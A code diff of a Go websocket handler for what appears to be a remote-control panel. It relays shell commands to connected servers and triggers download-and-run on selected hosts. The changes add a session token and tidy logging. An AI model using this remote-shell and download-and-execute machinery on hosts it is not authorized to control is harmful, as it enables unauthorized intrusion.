@@ -58,7 +58,7 @@ func WsHandle(c echo.Context) error {
 	if err != nil {
 		return err
 	}
-	u1, _ := uuid.NewV4()
+
 
 	defer func() {
 		wsMap = RemoveWs(ws)
@@ -69,9 +69,9 @@ func WsHandle(c echo.Context) error {
 
 	}()
 	wsMap = append(wsMap, ws)
-
-
-	shellMap[ws] = u1.String()
+	u1, _ := uuid.NewV4()
+	shellToken := u1.String()
+	shellMap[ws] = shellToken
 	for ; ; {
 		_, msg, err := ws.ReadMessage()
 		if err != nil {
@@ -82,7 +82,7 @@ func WsHandle(c echo.Context) error {
 		if len(m) == 1 {
 			m[0] = string(msg)
 		}
-		fmt.Println(string(msg),m[0])
+		fmt.Println("websocket::",string(msg))
 		switch m[0] {
 		case "online":
 			msg := fmt.Sprintf("config|%s|%s", httpPort, serverPort)
@@ -106,12 +106,11 @@ func WsHandle(c echo.Context) error {
 			}
 			return nil
 		case "shell":
+
 			var code string
 			id := m[1]
-			fmt.Println("id:",id,len(m))
 			if len(m) == 2 {
 				code = ""
-
 			} else {
 				decodeBytes, err := base64.StdEncoding.DecodeString(m[2])
 				if err != nil {
@@ -122,9 +121,12 @@ func WsHandle(c echo.Context) error {
 			}
 			for i := range serverMap {
 				if serverMap[i].uuid == id {
-					Handle(i, SERVER_SHELL)
+
 					if code != "" {
-						serverMap[i].shellInChan <- code+"\n"
+
+						serverMap[i].shellInChan <- shellToken + "|" +code+"\n"
+					}else{
+						go tlShellHandle(i)
 					}
 				}
 			}
@@ -147,14 +149,13 @@ func WsHandle(c echo.Context) error {
 			for _,id := range iid{
 				for i := range serverMap {
 					if serverMap[i].uuid == id {
-						fmt.Println("find it.")
 						FunctionDownload(i,address,save_path,run)
 					}
 				}
 			}
 			continue
 		case "info":
-			msg := fmt.Sprintf("info|%s|%s", len(wsMap), len(serverMap))
+			msg := fmt.Sprintf("info|%d|%d", len(wsMap), len(serverMap))
 			err := ws.WriteMessage(websocket.TextMessage, []byte(msg))
 			if err != nil {
 				wsMap = RemoveWs(ws)
